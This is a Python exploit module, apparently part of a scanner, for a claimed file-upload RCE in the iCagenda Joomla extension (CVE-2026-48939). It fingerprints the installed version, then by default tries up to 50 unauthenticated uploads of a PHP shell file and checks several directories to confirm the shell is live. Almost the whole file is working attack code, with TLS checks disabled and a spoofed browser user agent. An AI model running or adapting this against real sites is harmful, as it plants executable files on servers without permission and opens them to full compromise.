# cve_modules/cve_2026_48939.py
"""
CVE-2026-48939 — iCagenda Joomla Extension RCE
Adaptasi dari tools exploit Yoru (t.me/ChiefYoru)
diubah jadi modul scanning untuk main.py.

Alur deteksi:
  1. detect_icagenda()  -> cek extension + versi
  2. is_vuln_version()  -> cek range versi rentan
  3. deploy_shell()     -> upload probe shell & verifikasi
  4. return dict

Mode:
  - check_version_only=True  : cuma deteksi versi (TANPA upload artefak)
  - check_version_only=False : full exploit (upload shell + verifikasi)
"""

import hashlib
import os
import re

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_TIMEOUT = 15

# Probe shell minimal — cuma marker + form upload, tanpa exec command
PROBE_SHELL_CODE = (
    '''<?php echo '<a href="https://t.me/ChiefYoru">Yoru</a>'''
    '''<pre>'.php_uname();?>'''
)

SUBMIT_TASKS = ["registration.submit", "submit"]
ATTACHMENT_FIELDS = ["jform[attachment]", "jform[file]", "attachment", "file", "jform[attach]"]
DEST_PATHS = [
    "/images/icagenda/frontend/attachments/",
    "/images/icagenda/",
    "/images/",
    "/tmp/",
    "/media/com_icagenda/",
]


# ── helpers ──────────────────────────────────────────────────────────────

def _rand_str(n: int = 8) -> str:
    return hashlib.sha256(os.urandom(16)).hexdigest()[:n]


def _make_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/126.0.0.0 Safari/537.36"
    })
    s.verify = False
    return s


def _check_shell(sess, url, timeout) -> bool:
    try:
        r = sess.get(url, timeout=timeout, allow_redirects=True)
        if '<a href="https://t.me/ChiefYoru">Yoru' in r.text:
            if "<?=" in r.text or "<?php" in r.text.lower():
                return False
            return True
    except requests.RequestException:
        pass
    return False


# ── tahap 1: deteksi extension ──────────────────────────────────────────

def _detect_icagenda(host, timeout):
    """
    Return (found: bool, version: str|None).
    """
    sess = _make_session()
    for proto in ("https://", "http://"):
        base = f"{proto}{host}"
        # cara 1: baca XML manifest
        try:
            r = sess.get(
                f"{base}/administrator/components/com_icagenda/icagenda.xml",
                timeout=timeout,
            )
            if r.status_code == 200 and "icagenda" in r.text.lower() \
                    and "<version>" in r.text:
                m = re.search(r"<version>([\d.]+)</version>", r.text)
                return True, (m.group(1) if m else None)
        except requests.RequestException:
            pass

        # cara 2: cek beberapa marker path
        markers = 0
        for path in [
            "/components/com_icagenda/icagenda.php",
            "/media/com_icagenda/css/icagenda.css",
        ]:
            try:
                r = sess.head(f"{base}{path}", timeout=timeout,
                              allow_redirects=False)
                if r.status_code in (200, 301, 302, 403):
                    markers += 1
            except requests.RequestException:
                pass
        if markers >= 2:
            return True, None
    return False, None


# ── tahap 2: cek range versi rentan ─────────────────────────────────────

def _is_vuln_version(ver) -> bool:
    if not ver:
        return True  # versi tidak diketahui → anggap perlu diuji
    try:
        p = [int(x) for x in ver.split(".")]
        if p[0] < 3:
            return True
        if p[0] == 3 and len(p) > 1 and p[1] < 9:
            return True
        if p[0] == 3 and len(p) > 1 and p[1] == 9 and len(p) > 2 and p[2] < 15:
            return True
        if p[0] == 4 and len(p) > 1 and p[1] == 0 and len(p) > 2 and p[2] < 8:
            return True
        return False
    except (ValueError, IndexError):
        return True


# ── tahap 3: deploy & verifikasi shell ─────────────────────────────────

def _deploy_shell(host, timeout, max_attempts=50):
    pid = _rand_str(10)
    shell_name = f"ic_{pid}.php"
    sess = _make_session()
    attempts = 0

    for proto in ("https://", "http://"):
        base = f"{proto}{host}"
        for task in SUBMIT_TASKS:
            url = f"{base}/index.php?option=com_icagenda&task={task}"
            for field in ATTACHMENT_FIELDS:
                if attempts >= max_attempts:
                    return None, attempts
                attempts += 1
                try:
                    r = sess.post(
                        url,
                        data={"title": f"test_{pid}"},
                        files={field: (shell_name,
                                       PROBE_SHELL_CODE.encode(),
                                       "application/x-php")},
                        timeout=timeout,
                    )
                except requests.RequestException:
                    continue

                if r.status_code not in (200, 201, 302, 303):
                    continue

                for dest in DEST_PATHS:
                    shell_url = f"{base}{dest}{shell_name}"
                    if _check_shell(sess, shell_url, timeout):
                        return shell_url, attempts
                    alt = f"{base}{dest}{shell_name.replace('.php', '')}"
                    if _check_shell(sess, alt, timeout):
                        return alt, attempts

    return None, attempts


# ── entry point ─────────────────────────────────────────────────────────

def check_cve_2026_48939(target_url: str,
                         timeout: int = DEFAULT_TIMEOUT,
                         check_version_only: bool = False,
                         max_attempts: int = 50) -> dict:
    """
    Cek apakah target rentan terhadap CVE-2026-48939.

    Args:
        target_url         : URL target (boleh tanpa scheme)
        timeout            : timeout HTTP request (default 15s)
        check_version_only : kalau True, berhenti setelah deteksi versi
                             (TIDAK upload shell — nggak ninggalin artefak)
        max_attempts       : batas request POST saat deploy shell (default 50)

    Returns:
        {
            "vulnerable": bool,
            "evidence":   str | None,
            "reason":     str,
            "shell_url":  str | None,
            "version":    str | None,
        }
    """
    target = target_url.rstrip("/")
    target = re.sub(r"^https?://", "", target)

    # ── tahap 1: deteksi iCagenda ────────────────────────────────────
    has_icagenda, version = _detect_icagenda(target, timeout)
    if not has_icagenda:
        return {"vulnerable": False, "evidence": None,
                "reason": "icagenda_not_found", "shell_url": None,
                "version": None}

    # ── tahap 2: cek versi ───────────────────────────────────────────
    if not _is_vuln_version(version):
        return {"vulnerable": False, "evidence": None,
                "reason": f"version_{version}_not_vulnerable",
                "shell_url": None, "version": version}

    # mode cek-versi-saja: nggak lanjut upload
    if check_version_only:
        return {"vulnerable": True,
                "evidence": f"iCagenda version {version or 'unknown'} "
                            f"in vulnerable range (not exploited)",
                "reason": "vulnerable_version_detected",
                "shell_url": None, "version": version}

    # ── tahap 3: deploy shell & verifikasi ──────────────────────────
    shell_url, attempts = _deploy_shell(target, timeout,
                                        max_attempts=max_attempts)
    if shell_url:
        return {"vulnerable": True,
                "evidence": f"PHP shell accessible at {shell_url} "
                            f"(after {attempts} attempts)",
                "reason": "arbitrary_file_upload",
                "shell_url": shell_url, "version": version}

    return {"vulnerable": False, "evidence": None,
            "reason": f"upload_failed_after_{attempts}_attempts",
            "shell_url": None, "version": version}